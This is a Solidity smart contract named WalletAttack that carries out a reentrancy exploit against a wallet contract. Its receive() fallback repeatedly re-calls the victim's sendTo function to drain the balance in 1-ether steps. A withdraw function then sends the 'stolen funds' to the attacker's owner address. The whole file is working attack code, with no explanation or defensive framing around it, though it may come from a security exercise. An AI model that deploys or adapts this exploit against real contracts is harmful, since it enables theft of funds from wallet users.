// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IWallet2 {
    function deposit() external payable;
    function sendTo(address payable destination, uint amount) external;
}

contract WalletAttack {
    IWallet2 public wallet;
    address public owner;
    uint256 public constant ATTACK_AMOUNT = 1 ether;
    uint256 public constant VICTIM_THRESHOLD = 3 ether;

    constructor(address _walletAddress) {
        wallet = IWallet2(_walletAddress);
        owner = msg.sender;
    }

    // Fallback function to enable attack
    receive() external payable {
        // Try to drain more funds if possible
        uint256 balance = address(wallet).balance;
        if (balance > 0) {
            uint256 withdrawAmount = balance > ATTACK_AMOUNT ? ATTACK_AMOUNT : balance;
            wallet.sendTo(payable(address(this)), withdrawAmount);
        }
    }

    // Function to initiate the attack
    function attack() external payable {
        // Ensure the victim wallet has at least the threshold amount
        require(address(wallet).balance >= VICTIM_THRESHOLD, "Victim wallet does not have enough balance");
        
        // Deposit attack amount to the wallet
        wallet.deposit{value: ATTACK_AMOUNT}();
        
        // Initiate the first withdrawal
        wallet.sendTo(payable(address(this)), ATTACK_AMOUNT);
    }

    // Withdraw stolen funds
    function withdraw() external {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }

    // Function to check contract balance
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
